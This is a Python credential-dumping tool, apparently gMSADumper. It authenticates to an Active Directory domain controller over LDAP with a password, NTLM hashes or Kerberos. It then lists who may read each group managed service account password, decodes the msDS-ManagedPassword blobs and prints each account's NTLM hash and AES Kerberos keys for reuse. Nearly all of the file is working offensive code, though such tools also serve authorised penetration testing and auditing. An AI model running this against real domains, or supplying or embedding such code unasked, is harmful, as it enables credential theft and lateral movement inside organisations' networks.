#!/usr/bin/env python3
import ssl
import ldap3.core.exceptions
import ldap3.operation.bind
from impacket.smbconnection import SMBConnection
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from ldap3 import SUBTREE
import argparse
from binascii import hexlify, unhexlify
from Cryptodome.Hash import MD4
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
from impacket.structure import Structure
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
import sys

parser = argparse.ArgumentParser(description='Dump gMSA Passwords')
parser.add_argument('-u','--username', help='username for LDAP', required=False)
parser.add_argument('-p','--password', help='password for LDAP (or LM:NT hash)',required=False)
parser.add_argument('-d','--domain', help='Domain', required=True)
parser.add_argument('-k', help='use kerberos authentication',required=False, action='store_true')
parser.add_argument('-dc-ip', action='store', metavar="ip address",
                      help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
parser.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
parser.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')


class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]


def get_machine_name(args, domain):
    if args.dc_ip is not None:
        s = SMBConnection(args.dc_ip, args.dc_ip)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName()


def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None,
                         TGT=None, TGS=None, useCache=True):
    from pyasn1.codec.ber import encoder, decoder
    from pyasn1.type.univ import noValue
    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    # Importing down here so pyasn1 is not required if kerberos is not used.
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    import datetime

    if TGT is not None or TGS is not None:
        useCache = False

    target = 'ldap/%s' % target
    if useCache:
        domain, user, TGT, TGS = CCache.parseFile(domain, user, target)

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
                                                                    aesKey, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
                                                                sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True


def init_ldap_connection(target, tls_version, args, domain, username, password, lmhash, nthash):
    user = '%s\\%s' % (domain, username)
    connect_to = target
    if args.dc_ip is not None:
        connect_to = args.dc_ip
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if args.k:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, args.aesKey, kdcHost=args.dc_ip)
    elif args.hashes is not None:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(args, domain, username, password, lmhash, nthash):
    if args.k:
        target = get_machine_name(args, domain)
    else:
        if args.dc_ip is not None:
            target = args.dc_ip
        else:
            target = domain
    try:
        return init_ldap_connection(target, ssl.PROTOCOL_TLSv1_2, args, domain, username, password, lmhash, nthash)
    except ldap3.core.exceptions.LDAPSocketOpenError:
        try:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1, args, domain, username, password, lmhash, nthash)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(target, None, args, domain, username, password, lmhash, nthash)


def main():
    args = parser.parse_args()
    if args.hashes is not None:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if args.password and not args.username:
        print("specify a username or use -k for kerberos authentication")
        sys.exit(-1)

    server, conn = init_ldap_session(
        username=args.username,
        password=args.password,
        domain=args.domain,
        args=args,
        nthash=nthash,
        lmhash=lmhash
    )
    if server.ssl:
        success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])
    else:
        print('Unable to start a TLS connection. Is LDAPS enabled? Only ACLs will be listed and not ms-DS-ManagedPassword.\n')
        success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-GroupMSAMembership'])
    
    if success:
        if len(conn.entries) == 0:
            print('No gMSAs returned.')
        for entry in conn.entries:
                sam = entry['sAMAccountName'].value
                print('Users or groups who can read password for '+sam+':')
                for dacl in SR_SECURITY_DESCRIPTOR(data=entry['msDS-GroupMSAMembership'].raw_values[0])['Dacl']['Data']:
                    conn.search(base_creator(args.domain), '(&(objectSID='+dacl['Ace']['Sid'].formatCanonical()+'))', attributes=['sAMAccountName'])
                    
                    # Added this check to prevent an error from occuring when there are no results returned
                    if len(conn.entries) != 0:
                        print(' > ' + conn.entries[0]['sAMAccountName'].value)

                if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
                    data = entry['msDS-ManagedPassword'].raw_values[0]
                    blob = MSDS_MANAGEDPASSWORD_BLOB()
                    blob.fromString(data)
                    currentPassword = blob['CurrentPassword'][:-2]

                    # Compute ntlm key
                    ntlm_hash = MD4.new ()
                    ntlm_hash.update (currentPassword)
                    passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                    userpass = sam + ':::' + passwd
                    print(userpass)

                    # Compute aes keys
                    password = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')
                    salt = '%shost%s.%s' % (args.domain.upper(), sam[:-1].lower(), args.domain.lower())
                    aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents)
                    aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents)
                    print('%s:aes256-cts-hmac-sha1-96:%s' % (sam, aes_256_hash.decode('utf-8')))
                    print('%s:aes128-cts-hmac-sha1-96:%s' % (sam, aes_128_hash.decode('utf-8')))
    else:
        print('LDAP query failed.')
        print(success)

if __name__ == "__main__":
    main()
